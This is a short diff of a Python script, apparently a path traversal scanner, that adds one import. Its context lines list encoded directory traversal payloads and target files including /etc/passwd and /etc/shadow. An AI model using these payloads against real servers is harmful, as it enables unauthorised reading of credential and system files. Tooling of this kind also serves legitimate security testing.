@@ -1,5 +1,6 @@
 import requests
 import argparse
+import re
 
 traversal = ["../", "%2e%2e/", ".%2e/", "%2e./", "%252e%252e/", "%252e%252e\\", "..%c0%af", "..%c1%9c", "%2e%2e%c0%af", "%252e%252e%c1%9c", "%252e%252e%c0%af"]
 absolute_path = ["/var/www/html/index.html", "/var/www/html/get.php", "/var/www/html/admin/get.inc", "/etc/passwd", "/etc/shadow"]
